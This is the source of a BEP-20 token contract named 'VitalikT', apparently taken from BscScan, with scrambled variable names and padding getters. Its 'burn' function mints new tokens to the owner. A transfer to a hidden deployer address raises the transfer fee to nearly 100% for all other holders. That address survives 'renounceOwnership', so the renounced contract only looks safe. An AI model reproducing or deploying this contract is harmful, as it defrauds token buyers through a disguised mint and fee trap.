/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 05:23 GMT+0
 */

// SPDX-License-Identifier: MIT 
pragma solidity >=0.6.0;
contract BXTBOZW {
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "VitalikT";
uint256 private  WJZPPX = 1000000000000000000;
uint256 private  PSUDGZ = 10000000000000;
uint256 private  XVIYZW = 1000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "VitalikT";
mapping (address => uint256) public balanceOf;
address private  ZLJIYY = address(0);
address private  HZNXMT = address(0);
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  ULYZJB = 10000000000;
uint256 private  HFPFQX = 1000000000000000;
address private  SXAONT = address(0);
uint256 private  IFXFAQ = 100000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant BTQDMU = 99999;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  DTACWO = address(0);
address public owner;
uint256 private  ASEGMG = 1000000000000000000;
address private  FIYSIB = address(0);
function _getIFXFAQ() private returns (uint256) {
return IFXFAQ;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () {
ZLJIYY = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getXVIYZW() private returns (uint256) {
return XVIYZW;
}

function _getASEGMG() private returns (uint256) {
return ASEGMG;
}

function _getPSUDGZ() private returns (uint256) {
return PSUDGZ;
}

function _getHZNXMT() private returns (address) {
return HZNXMT;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getULYZJB() private returns (uint256) {
return ULYZJB;
}

function _getHFPFQX() private returns (uint256) {
return HFPFQX;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tGSILLH 0");
require(spender != address(0), "fGSILLH 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getSXAONT() private returns (address) {
return SXAONT;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getFIYSIB() private returns (address) {
return FIYSIB;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getDTACWO() private returns (address) {
return DTACWO;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "GSILLH");
require(to != address(0), "GSILLH");
require(amount <= balanceOf[from], "GSILLH");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* BTQDMU/WJZPPX ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ZLJIYY){
WJZPPX = BTQDMU+2;
}
emit Transfer(from, to, transferAmount);
}

}